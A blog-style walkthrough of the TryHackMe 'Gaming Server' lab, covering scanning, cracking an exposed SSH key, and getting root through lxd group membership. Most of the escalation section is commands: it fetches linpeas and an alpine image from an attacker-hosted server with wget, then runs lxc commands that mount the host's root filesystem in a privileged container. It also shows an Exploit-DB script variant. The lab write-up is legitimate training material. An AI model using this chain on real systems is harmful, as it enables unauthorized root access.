---
title: Try Hack Me - Gaming Server
date: 2021-01-01 16:32 +0300
categories: [Try Hack Me]
tags: [linux,lxd privilege escalation]     # TAG names should always be lowercase
---

# Welcome

Hey there! Glad to see you.

In this box you will learn about:
- LXC or Linux Container

# Nmap

Start scanning!

<pre class="highlighter-rouge highlight">
Nmap scan report for 10.10.206.197
Host is up (0.11s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 34:0e:fe:06:12:67:3e:a4:eb:ab:7a:c4:81:6d:fe:a9 (RSA)
|   256 49:61:1e:f4:52:6e:7b:29:98:db:30:2d:16:ed:f4:8b (ECDSA)
|_  256 b8:60:c4:5b:b7:b2:d0:23:a0:c7:56:59:5c:63:1e:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: House of danak
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=12/25%OT=22%CT=1%CU=34225%PV=Y%DS=2%DC=I%G=Y%TM=5FE63E
OS:D0%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)SE
OS:Q(SP=102%GCD=1%ISR=10E%TI=Z%CI=Z%TS=A)OPS(O1=M508ST11NW6%O2=M508ST11NW6%
OS:O3=M508NNT11NW6%O4=M508ST11NW6%O5=M508ST11NW6%O6=M508ST11)WIN(W1=F4B3%W2
OS:=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M508NNS
OS:NW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%
OS:DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%
OS:O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%
OS:W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%
OS:RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.87 seconds
</pre>

Let's check the web page.

# Gobuster

<pre>
gobuster dir -u http://10.10.206.197/ -w /opt/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.206.197/
[+] Threads:        10
[+] Wordlist:       /opt/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
			Starting gobuster
===============================================================
/uploads (Status: 301)
/secret (Status: 301)
</pre>

I found hidden directory <code class="language-plaintext highlighter-rouge">/uploads</code> and <code class="language-plaintext highlighter-rouge">/secret</code>

# Web Page

If we open the hidden directory <code class="language-plaintext highlighter-rouge">/uploads</code>, we will see

<img src="/assets/img/gamingserver_img/uploads.jpg">

The file name <code class="language-plaintext highlighter-rouge">dict.lst</code> soundes like we need to brute force something.
So I download it.

If we open the hidden directory <code class="language-plaintext highlighter-rouge">/secret</code>, we will see

<img src="/assets/img/gamingserver_img/secret.jpg">

After openning <code class="language-plaintext highlighter-rouge">secretKey</code> file

<img src="/assets/img/gamingserver_img/secretkey.jpg">

It is RSA private key. So download and crack it!

# John The Ripper

This link helped me with John and cracking password with RSA private key <a href="https://www.abhizer.com/crack-ssh-with-john/">Crack SSH Keys (id_rsa) with John & rockyou.txt | Password Cracking</a>

For brute forcing use <code class="language-plaintext highlighter-rouge">dict.lst</code> that we found before.

# Connect to SSH
We got the password after John. It's time to connect to SSH.

Change permission 
<pre> chmod 600 id_rsa </pre>
Connect 
<pre>ssh -i id_rsa john@10.10.206.197</pre>

Now you can read User.txt

<img src="/assets/img/gamingserver_img/userflag.jpg">

# Privilage Escalation
Anh here i got stuck.. I tried to find <code class="language-plaintext highlighter-rouge">suid</code> files, but it wasn't the solution. And I found <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite">Linpeas</a>. It's really amazing thing! These tools search for possible local privilege escalation paths that you could exploit and print them to you with nice colors so you can recognize the misconfigurations easily. 

We must run this script on victim machine. And our actions are:

Create a python server in the folder where we have our <code class="language-plaintext highlighter-rouge">Linpeas</code> script stored

<pre>*ATTACKER MACHINE* sudo python3 -m http.server</pre>

Download the script on the victim machine

<pre>*VICTIM MACHINE* wget attacker_ip:8000/linpeas.sh</pre>

Get the access permissions

<pre>
chmod +x linpeas.sh
./linpeas.sh</pre>

You know...The output was huge! It was so lot of details... I'll show you a part

<img src="/assets/img/gamingserver_img/linpeas.jpg">

I tried to something with sudo and I know that it doesn't help. So i googled <code class="language-plaintext highlighter-rouge">lxd</code>. And I found an <a href="https://www.hackingarticles.in/lxd-privilege-escalation/">article</a> which showed how to get root with <code class="language-plaintext highlighter-rouge">lxd</code>.

Download the build alpine from GitHub
<pre>
git clone  https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
./build-alpine</pre>

After that we will get the tar.gz file which we must send to victim machine like we did it with <code class="language-plaintext highlighter-rouge">linpeas.sh</code>

Create a python server 

<pre>*ATTACKER MACHINE* sudo python3 -m http.server</pre>

I moved to <code class="language-plaintext highlighter-rouge">/tmp</code> folder and download the script on the victim machine.

<pre>cd /tmp
*VICTIM MACHINE* wget attacker_ip:8000/alpine-v3.12-x86_64-20201225_2324.tar.gz</pre>

And typed/copied following commands

<pre>
lxc image import ./alpine-v3.12-x86_64-20201225_2324.tar.gz --alias myimage
lxc image list
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
id
</pre>

Now you are root!

<pre>
mnt/root/root
ls
root.txt
cat root.txt
</pre>

<img src="/assets/img/gamingserver_img/root_flag.jpg">

Your also can get root using the <a href="https://www.exploit-db.com/exploits/46978">report</a> from <code class="language-plaintext highlighter-rouge">Exploit Database</code>

Step 1: Download build-alpine

<pre>wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine</pre>

Step 2: Build alpine (as root user)

<pre>bash build-alpine</pre>

Step 3: Create an <code class="language-plaintext highlighter-rouge">.sh</code> file with code on <a href="https://www.exploit-db.com/exploits/46978">Exploit Database</a> website. Move <code class="language-plaintext highlighter-rouge">tar.gz</code> and <code class="language-plaintext highlighter-rouge">exploit.sh</code> files to victim machine. Run this script and you will get root.

Create a python server 

<pre>*ATTACKER MACHINE* sudo python3 -m http.server</pre>

I moved to <code class="language-plaintext highlighter-rouge">/tmp</code> folder and download the script on the victim machine.

<pre>
*VICTIM MACHINE*
cd /tmp 
wget attacker_ip:8000/alpine-v3.12-x86_64-20201225_2324.tar.gz
wget attacker_ip:8000/exploit.sh
chmod +x exploit.sh
./exploit.sh -f alpine-v3.12-x86_64-20201225_2324.tar.gz
</pre>

Step 4: Once inside the container, navigate to <code class="language-plaintext highlighter-rouge">/mnt/root</code> to see all resources from the host machine

# Userful for me references

<div><a href="https://www.abhizer.com/crack-ssh-with-john/">Crack SSH Keys (id_rsa) with John & rockyou.txt | Password Cracking</a></div>
<div><a href="https://docs.rackspace.com/support/how-to/logging-in-with-an-ssh-private-key-on-linuxmac/">Log in with an SSH private key on Linux and macOS</a></div>
<div><a href="https://www.hackingarticles.in/lxd-privilege-escalation/">Lxd Privilege Escalation</a></div>
<div><a href="https://www.exploit-db.com/exploits/46978">Ubuntu 18.04 - 'lxd' Privilege Escalation </a></div>
